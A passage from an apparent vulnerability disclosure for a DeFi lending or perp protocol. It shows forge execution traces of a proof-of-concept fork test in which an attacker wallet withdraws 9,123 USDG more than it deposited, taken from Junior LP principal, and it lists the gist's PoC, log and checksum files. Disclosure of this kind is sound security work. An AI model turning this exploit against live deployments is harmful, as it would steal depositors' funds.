4232:    │   ├─ emit DepositSharesClaimed(controller: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], epochId: 498316 [4.983e5], assets: 95000000000000 [9.5e13], shares: 94787343818440629 [9.478e16])
5326:    │   │   │   │   │   │   │   ├─ emit AssetSeized(account: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], asset: 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D, amount: 62970443495 [6.297e10], recipient: 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e)
5364:    │   │   │   │   │   │   ├─ emit ActionChargeSettled(account: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], assessedAssets: 73030548460 [7.303e10], recoveredAssets: 73030548460 [7.303e10], waivedAssets: 0)
5366:    │   │   │   │   │   ├─ emit PositionClosed(account: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], side: 1, sizeDelta: 23804500000000000000000000 [2.38e25], price: 96615895 [9.661e7], pnl: 860532675 [8.605e8])
5689:    │   │   ├─ emit Transfer(from: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount: 1132365885638 [1.132e12])
15923:    │   ├─ emit Transfer(from: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], to: 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e, amount: 94787343818440629 [9.478e16])
27807:    ├─ [0] VM::prank(0xC60408d3f42A7Aa49889bc94BA6a74b9801b7BDA, 0xC60408d3f42A7Aa49889bc94BA6a74b9801b7BDA)
27871:    │   │   ├─ [518335] 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e::settleLpEpoch(96594578 [9.659e7], 1793944815 [1.793e9])
27979:    │   │   │   ├─ emit LpEpochSettled(cutoffEpoch: 498318 [4.983e5], seniorRedeemAssets: 0, juniorRedeemAssets: 95026662364267 [9.502e13], juniorDepositAssets: 0, seniorDepositAssets: 0, seniorBacklog: false, juniorBacklog: false, entriesDeferred: false)
28035:    │   │   ├─ emit Transfer(from: 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e, to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount: 95026662364267 [9.502e13])
28104:    │   │   ├─ emit Transfer(from: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, to: attacker-keeper: [0x757e19DEB10f0613E63D09d68a6eDabBdcf5e56C], amount: 200000 [2e5])
28132:    ├─ [2537] 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
28133:    │   └─ ← [Return] 96159028249905 [9.615e13]
28134:    ├─ [2537] 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D::balanceOf(attacker-keeper: [0x757e19DEB10f0613E63D09d68a6eDabBdcf5e56C]) [staticcall]
28135:    │   └─ ← [Return] 200000 [2e5]
```

```
    account                    before                     after                      delta
    ATTACKER (2 wallets)       96,149,904.854584 USDG     96,159,028.449905 USDG     +9,123.595321 USDG
    INCUMBENT JUNIOR SHARES    101,015,273.516510 USDG    100,983,475.550115 USDG    -31,797.966395 USDG

    ATTACKER before = USDG minted into its wallets; after = USDG in its wallets after every withdrawal.
    INCUMBENT before = value at 06:00:21 when an honest depositor makes the same deposit; after = with the attacker.

  The attacker withdrew 9,123.595321 USDG more than it put in, out of the incumbent Junior LPs' principal.
```

The USDG token's own events net to +9,123.595321 USDG for the attacker's wallets (lines 703 to 28104), and its `balanceOf` returns at the end agree (lines 28133 and 28135).

### Other files in the gist

- `NegativeVpiRebateForkData.sol`: the generated data file the test imports. It is put next to the test.
- `forge-test-vv.log`: both tests at `-vv`. The excerpts above come from it.
- `forge-test-vvvv.log`: the headline test with forge's full execution trace, every call, return value and decoded event.
- `forge-test-controls-vvvv.log`: the controls test with full traces (69 MB).
- `evidence-from-trace.txt`: the impact for every scenario rebuilt only from the USDG `Transfer` events and `balanceOf` returns in the two `-vvvv` traces, made by `extract_evidence.py`.
- `trace-key-lines.txt`: the mechanism lines grepped from `forge-test-vvvv.log`, with line numbers.
- `epoch-settlers.tsv`: every `LpEpochSettled` and Junior or Senior `DepositRequested` since deployment, with the sender and the delay after the hour, from `eth_getLogs` on Arbitrum Sepolia.
- `clean-export-command.log`: the command above run in a fresh `git archive` of `a82d4fef` with only the two PoC files added.
- `VERSIONS.txt`: tool versions, commit pins, the live `git ls-remote` of upstream main, and sha256 of the PoC files that ran.
- `run.sh`: runs both tests at `-vv` and `-vvvv` and saves every output.
- `SHA256SUMS.txt`: sha256 of every file in the gist.
- In `VERSIONS.txt`, `run.sh`, `forge-test-vv.log` and `clean-export-command.log`, the absolute path of my local checkout is replaced with `<repo>`, `<finding>` or `<clean-export>`. The `-vvvv` traces are uploaded byte for byte.

